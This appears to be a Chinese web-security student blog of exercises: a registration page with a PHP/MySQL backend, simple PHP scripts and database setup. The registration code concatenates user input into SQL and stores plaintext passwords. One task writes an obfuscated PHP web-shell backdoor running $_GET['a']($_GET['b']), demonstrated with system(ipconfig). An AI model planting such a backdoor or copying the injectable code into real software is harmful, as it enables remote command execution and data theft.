class="attribute">margin-bottom</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">600</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h2</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">bottom</span>: -<span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#4a90e2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">label</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#555</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">500</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">12px</span> <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: all <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span><span class="selector-pseudo">:focus</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span><span class="selector-pseudo">:focus</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-color</span>: <span class="number">#4a90e2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">outline</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">3px</span> <span class="built_in">rgba</span>(<span class="number">74</span>, <span class="number">144</span>, <span class="number">226</span>, <span class="number">0.2</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">600</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: all <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#4a90e2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#3a7bc8</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.98</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.5</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn</span><span class="selector-pseudo">:active</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation</span>: ripple <span class="number">0.6s</span> linear;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="keyword">@keyframes</span> ripple &#123;</span></span><br><span class="line"><span class="language-css">            <span class="number">0%</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="number">100%</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 响应式设计 */</span></span></span><br><span class="line"><span class="language-css">        <span class="keyword">@media</span> (<span class="attribute">max-width</span>: <span class="number">480px</span>) &#123;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">30px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>用户注册<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是美化后的代码，看一下效果</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508151453627.png"></p><p>②添加后端</p><p>需要编写后端代码，来完善注册功能</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$dbusername</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpassword</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;cms&quot;</span>;</span><br><span class="line"><span class="comment">//处理前端输入数据</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">@<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">@<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>,<span class="variable">$dbusername</span>,<span class="variable">$dbpassword</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select uname from user where uname = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//判断用户是否存在</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>] != <span class="variable">$username</span>)&#123; </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into cms.user(uname,pass) value (&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$registerchack</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//注册成功跳转到登录页面</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$registerchack</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/login.php&#x27;</span>,<span class="literal">true</span>,<span class="number">301</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;注册失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;用户名已存在&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>③效果验证</p><p>输入用户名为admin，密码admin</p><p><img src="C:\Users\thy\AppData\Roaming\Typora\typora-user-images\image-20250815155448290.png" alt="image-20250815155448290"></p><p>成功跳转，并成功创建了一个用户</p><p>我们来验证输入重复用户名注册</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508151619479.png"></p><p>显示用户名已存在</p><p>4、使用yakit或者burp抓取注册功能点的数据包，手动修改数据包实现注册第二个用户<br>5、实现查看当前网页注册用户的功能<br>6、完善登录功能点的逻辑，实现登录操作</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web练习3</title>
      <link href="/2025/08/13/web%E7%BB%83%E4%B9%A03/"/>
      <url>/2025/08/13/web%E7%BB%83%E4%B9%A03/</url>
      
        <content type="html"><![CDATA[<h4 id="1、编写一个函数，要求可以根据前端传递的参数判断当前月份，要求传递的数字不符合1-12的规范时有报错提示"><a href="#1、编写一个函数，要求可以根据前端传递的参数判断当前月份，要求传递的数字不符合1-12的规范时有报错提示" class="headerlink" title="1、编写一个函数，要求可以根据前端传递的参数判断当前月份，要求传递的数字不符合1-12的规范时有报错提示"></a>1、编写一个函数，要求可以根据前端传递的参数判断当前月份，要求传递的数字不符合1-12的规范时有报错提示</h4><p>①编写php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>&gt;=<span class="number">1</span> &amp;&amp; <span class="variable">$a</span>&lt;=<span class="number">12</span>)&#123;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;January&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;February&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;March&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;April&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;May&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;June&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;July&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;August&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;September&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;October&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;November&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;December&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The input number is illegal&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②在网页验证</p><p>在url栏输入?a&#x3D;8和?a&#x3D;19</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141604949.png"></p><p>成功回显</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141605458.png"></p><p>发生报错</p><h4 id="2、编写一个函数，要求前端传递参数6，函数执行1-2-3-4-5-6，输出最终结果"><a href="#2、编写一个函数，要求前端传递参数6，函数执行1-2-3-4-5-6，输出最终结果" class="headerlink" title="2、编写一个函数，要求前端传递参数6，函数执行1+2+3+4+5+6，输出最终结果"></a>2、编写一个函数，要求前端传递参数6，函数执行1+2+3+4+5+6，输出最终结果</h4><p>①编写php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$a</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$i</span> + <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$i</span>++;</span><br><span class="line"><span class="variable">$a</span>--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②网页做验证</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141623966.png"></p><p>成功回显</p><h4 id="3、为写好的两个函数编写注释，解释作用"><a href="#3、为写好的两个函数编写注释，解释作用" class="headerlink" title="3、为写好的两个函数编写注释，解释作用"></a>3、为写好的两个函数编写注释，解释作用</h4><p>①题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];  <span class="comment">//接收前端参数a通过get传参，赋值给变量$a                   </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>&gt;=<span class="number">1</span> &amp;&amp; <span class="variable">$a</span>&lt;=<span class="number">12</span>)&#123;  <span class="comment">//if条件判断输入数字是否在1-12范围内，若是，则执行switch函数</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)&#123;  <span class="comment">//根据变量值，输出相应内容</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;January&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;February&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;March&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;April&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;May&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;June&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;July&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;August&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;September&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;October&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;November&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;December&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  <span class="comment">//若不在1-12范围，则执行下面内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The input number is illegal&quot;</span>;  <span class="comment">//提示输入不合法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];  <span class="comment">//接收前端a参数通过get传参，赋值给变量a</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;  <span class="comment">//定义一个变量i，值为1</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;  <span class="comment">//定义一个变量b，值为0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$a</span>&gt;<span class="number">0</span>)&#123;  <span class="comment">//条件判断，若a&lt;=0时，跳出循环</span></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$i</span> + <span class="variable">$b</span>;  <span class="comment">//执行和运算，如1+0，2+1，3+3，达到题目要求  </span></span><br><span class="line"><span class="variable">$i</span>++;  <span class="comment">//$i自加</span></span><br><span class="line"><span class="variable">$a</span>--;  <span class="comment">//$a自减</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;  <span class="comment">//输出最终值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4、使用动态函数编写一个简单的后门"><a href="#4、使用动态函数编写一个简单的后门" class="headerlink" title="4、使用动态函数编写一个简单的后门"></a>4、使用动态函数编写一个简单的后门</h4><p>①编写php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$A</span> = <span class="string">&quot;G&quot;</span>;  <span class="comment">//定义$A，赋值为字符G</span></span><br><span class="line"><span class="variable">$B</span> = <span class="string">&quot;ET&quot;</span>;  <span class="comment">//定义$B，赋值为字符ET</span></span><br><span class="line"><span class="variable">$C</span> = <span class="string">&quot;_&quot;</span>.<span class="variable">$A</span>.<span class="variable">$B</span>;  <span class="comment">//定义$C，将字符拼接，赋值给$C，$C此时被赋值字符串为“_GET”</span></span><br><span class="line"><span class="variable">$D</span> = <span class="variable">$$C</span>;  <span class="comment">//定义$D，通过可变变量将$D赋值为超全局变量$_GET</span></span><br><span class="line">@<span class="variable">$E</span> = <span class="variable">$D</span>[<span class="string">&quot;a&quot;</span>];  <span class="comment">//定义$E接收前端传参a</span></span><br><span class="line">@<span class="variable">$F</span> = <span class="variable">$D</span>[<span class="string">&quot;b&quot;</span>];  <span class="comment">//定义$F接收前端传参b</span></span><br><span class="line">@<span class="variable">$E</span>(<span class="variable">$F</span>);  <span class="comment">//通过变形，达到$_GET[&quot;a&quot;]($_GET[&quot;b&quot;]),一个简单后门写好了</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②网页验证</p><p>url输入?a&#x3D;system&amp;b&#x3D;ipconfig，后端达到system(ipconfig)的效果</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141637013.png"></p><h4 id="5、创建一个student数据库，user表，字段包含name-id-tel，属性自定义"><a href="#5、创建一个student数据库，user表，字段包含name-id-tel，属性自定义" class="headerlink" title="5、创建一个student数据库，user表，字段包含name,id,tel，属性自定义"></a>5、创建一个student数据库，user表，字段包含name,id,tel，属性自定义</h4><p>①cmd登录数据库，用户名root，密码root</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uroot -proot</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141642330.png"></p><p>②查看当前有哪些数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141644693.png"></p><p>没有我们想要的库</p><p>③创建数据库student</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database student;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141646752.png"></p><p>成功创建数据库student</p><p>④创建表user,以及字段id、name、tel，id设为主键</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use student</span><br><span class="line">create table student.user(id int,name char(15),tel char(11),primary key(id));</span><br><span class="line">desc student.user</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141657918.png"></p><p>成功创建user表以及各字段</p><h4 